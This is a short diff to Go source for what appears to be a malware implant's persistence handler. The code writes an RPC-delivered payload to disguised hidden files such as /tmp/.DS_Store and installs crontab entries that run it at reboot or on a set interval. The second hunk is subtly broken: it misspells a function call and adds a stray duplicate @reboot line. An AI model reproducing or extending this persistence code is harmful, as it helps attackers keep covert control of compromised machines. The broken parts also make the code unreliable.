@@ -537,7 +537,11 @@ func persistHandler(data []byte, resp RPCResponse) {
 	ioutil.WriteFile("/tmp/.DS_Store", persistReq.Assembly, 0755)
 	cmd := exec.Command("crontab")
 	stdin, _ := cmd.StdinPipe()
-	io.WriteString(stdin, "*/5 * * * * /tmp/.DS_Store\n")
+	if persistReq.Minutes == 0 {
+		io.WriteString(stdin, "@reboot /tmp/.DS_Store\n")
+	} else {
+		io.WriteString(stdin, "*/"+fmt.Sprintf("%d", persistReq.Minutes)+" * * * * /tmp/.DS_Store\n")
+	}
 	stdin.Close()
 	cmd.Start()
 	cmd.Wait()
@@ -545,7 +549,12 @@ func persistHandler(data []byte, resp RPCResponse) {
 	ioutil.WiteFile("/tmp/...", persistReq.Assembly, 0755)
 	cmd := exec.Command("crontab")
 	stdin, _ := cmd.StdinPipe()
-	io.WriteString(stdin, "*/5 * * * * /tmp/...\n")
+	if persistReq.Minutes == 0 {
+		io.WriteString(stdin, "@reboot /tmp/...\n")
+	} else {
+		io.WriteString(stdin, "*/"+fmt.Sprintf("%d", persistReq.Minutes)+" * * * * /tmp/...\n")
+	}
+	io.WriteString(stdin, "@reboot /tmp/...\n")
 	stdin.Close()
 	cmd.Start()
 	cmd.Wait()
